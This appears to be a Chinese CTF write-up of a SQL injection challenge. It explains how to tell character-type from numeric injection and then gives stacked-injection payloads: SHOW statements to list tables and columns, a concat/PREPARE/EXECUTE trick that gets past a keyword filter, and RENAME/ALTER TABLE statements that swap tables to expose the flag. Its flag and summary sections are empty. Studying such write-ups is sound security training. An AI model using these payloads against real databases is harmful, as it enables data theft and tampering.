Author: Coder-LYQ
Date: 2020-12-22

## flag



## 思路

1. 对于这类直观的SQL注入题目，可以直接输入几组数据进行测试。输入1，会正常显示查询结果。

   接下来就判断是字符型注入还是数字型注入。

   一般数字型注入：

   ​	`select * from *** where id=num`

   - 2-1  --》 正常显示输入1时的结果
   - 1 and 1=1和1 and 1=2 两次结果不同

   字符型注入：

      `select * from *** where id ='num'`

   - 1' and '1'='1  和1' and '1'='2 结果不同
   - 1' and '1'='1' --+ 和 1' and '1'='2' --+ 结果不同

<img src="../images/image-20201222212022041.png" alt="image-20201222212022041" style="zoom:33%;" />

2. 本题输入1' and '1'='1，显示结果和直接输入1一致。

   <img src="../images/image-20201222213617141.png" alt="image-20201222213617141" style="zoom:33%;" />

   再输入1' and '1'='2，无任何结果显示。说明存在sql字符型注入。

   <img src="../images/image-20201222213724343.png" alt="image-20201222213724343" style="zoom:33%;" />

   3. 确定字符型注入之后，判断列数 1' order by 1/2/3--+

      order by 3时页面显示不正常，说明只存在两列。

      另一种判断列数方法，1' union select 1,2,3(....) --+

   4. 尝试union select语句时，页面直接显示：

      <img src="../images/image-20201222215509025.png" alt="image-20201222215509025" style="zoom:33%;" />

      说明waf将select、update、delete、drop、insert和where等关键字过滤。

   5. 考虑堆叠注入，利用;闭合前面语句的执行，再加上需要执行的语句，且以上常见的关键字都被过滤掉了--》可以使用`show databases/tables/columns from table`来获取数据库、数据表和列名。

   6. 获取数据库相关信息   

      `1';show databases;--+`

      获取当前数据库中的表信息

      `1';show tables;--+`

      <img src="../images/image-20201222220208159.png" alt="image-20201222220208159" style="zoom:33%;" />

      获取表中的列信息

      `1';show columns from words;--+`

      <img src="../images/image-20201222220640461.png" alt="image-20201222220640461" style="zoom:33%;" />

      `1';show columns from 1919810931114514;--+` (当数据表名为数字时，需要使用``括起来)
      
      <img src="../images/image-20201222220806395.png" alt="image-20201222220806395" style="zoom:33%;" />
      
   7. 可以从两个的列信息中看出，words中主要是id和data两列，有可能在输入框中输入数字时，后端读取的就是该表中的内容；另一个表中有flag列，说明flag可能存在于该表中。
   
   8. 因此，要想获取flag，则有两种思路：
   
      1. 直接从flag列中读取
      2. 将表1919810931114514添加一列id，并改名成flag（让前端传数据到后端后，后端实际操作的是该表，就可以直接将表中的数据读出来）
   
   9. 难点1：直接从flag表中读数据--》select被过滤
   
      `1';SEt @a=concat("SEl","ect flag from 1919810931114514");PRepare hello from @a;execute hello;#`
   
   10. 难点2：“换个名”（考察对sql操作熟练程度）
   
       `1’;rename table words to new_word;rename table 1919810931114514 to new_19198;alter table new_19198 add id int unsigned not Null auto_increment primary key; alert table new_19198 change flag data varchar(100);#`

## 总结

